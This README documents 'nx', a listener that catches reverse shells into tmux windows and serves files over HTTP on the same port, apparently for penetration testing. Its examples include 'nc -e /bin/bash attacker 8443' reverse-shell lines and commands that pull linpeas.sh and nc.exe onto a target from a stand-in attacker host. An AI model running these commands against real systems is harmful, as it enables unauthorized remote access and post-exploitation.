# nx

[n]etcat + tmu[x] - listen on a port and forward the stream to a tmux session

## Prerequisites

- tmux - required for session/window management
- socat - required for TTY handling and keystroke forwarding

## Usage

1. start a listener
```sh
nx -vp 9090
```

2. from a different machine, initiate the reverse shell
3. nx catches the connection then starts a tmux window in the `nx` session, and starts the shell there

```
Usage:
  nx [OPTIONS]

Application Options:
      --auto       Attempt to auto-upgrade to a tty (deprecated: use --exec auto)
      --exec=      Execute plugin script on connection
  -i, --host=      Interface address on which to bind (default: 0.0.0.0)
  -p, --port=      Port on which to bind (default: 8443)
  -t, --target=    Tmux session name (default: nx)
  -v, --verbose    Debug logging
      --sleep=     adjust if --auto is failing (default: 500ms)
  -d, --serve-dir= Directory to serve files from over HTTP
```

## Features

- **Plugin system**: Use `--exec <plugin>` to run custom scripts on connection
- **Auto-upgrade to TTY**: Use `--exec auto` (or deprecated `--auto` flag) to automatically upgrade your shell to a TTY
- **Protocol multiplexing**: Serve files over HTTP on the same port as shell connections using `--serve-dir`
- **XDG runtime paths**: Automatically uses XDG runtime directory for socket location
- **Signal handling**: Properly handles signals and performs cleanup

## Plugin System

nx supports a plugin system for executing custom commands when a new connection is established. Plugins are shell scripts stored in `~/.config/nx/plugins/`.

### Creating Plugins

1. Create a shell script in `~/.config/nx/plugins/<name>.sh`
2. Make it executable: `chmod +x ~/.config/nx/plugins/<name>.sh`
3. Use the plugin: `nx --exec <name>`

### Plugin Format

Plugins are simple shell scripts with these features:
- Lines starting with `#` are ignored (comments)
- Empty lines are ignored
- All other lines are executed as tmux commands in the reverse shell

### Example Plugin

```bash
#!/bin/bash
# Custom upgrade script
echo "Setting up environment..."
export PATH=/usr/local/bin:$PATH
whoami
```

### Built-in Plugins

- **auto**: TTY upgrade script

## Protocol Multiplexing

nx can serve files over HTTP on the same port as shell connections. This allows you to host files and catch shells on a single port.

### HTTP File Serving

Enable file serving by specifying a directory with the `-d` or `--serve-dir` flag:

```bash
# Start nx with file serving enabled
nx -p 8443 -d ./files -v

# Shell connections still work normally
nc -e /bin/bash attacker 8443

# From target machine - download files
wget http://attacker:8443/linpeas.sh

```


### Mixed Operation Example

```bash
# Terminal 1: Start nx with both features
nx -p 8443 -d ./tools -v

# Terminal 2: Download a tool from target
curl http://attacker:8443/nc.exe -o nc.exe

# Terminal 3: Catch reverse shell
nc -e /bin/bash attacker 8443
```

### HTTP Response Codes

- `200 OK`: File served successfully
- `404 Not Found`: File doesn't exist or is a directory
- `405 Method Not Allowed`: Non-GET HTTP methods
- `500 Internal Server Error`: Server-side errors

## How?

unix domain sockets mannn

## ToDo
- [x] ~~maybe a plugin system for sending commands on connection~~ ✅ **DONE**: Implemented plugin system with `--exec` flag
- [x] ~~some mechanism to auto-upgrade the shell to a TTY via tmux-send-keys or sourcing a script that just adds the keybinds, so that it's up to the user to fire off the upgrade~~ ✅ **DONE**: Auto-upgrade via `--exec auto`
- [x] ~~alternatively, multiplex the connection to allow `curl | sh` from the same port~~ ✅ **DONE**: Protocol multiplexing with `--serve-dir`
- [x] ~~multiplexing listener~~ ✅ **DONE**: HTTP/shell protocol detection on same port
- [ ] handle stdio with the socket directly with `nx`, eliminating the need for `socat`
- [ ] facilitate installing plugins dir to xdg
- [ ] super simple chisel-light functionality
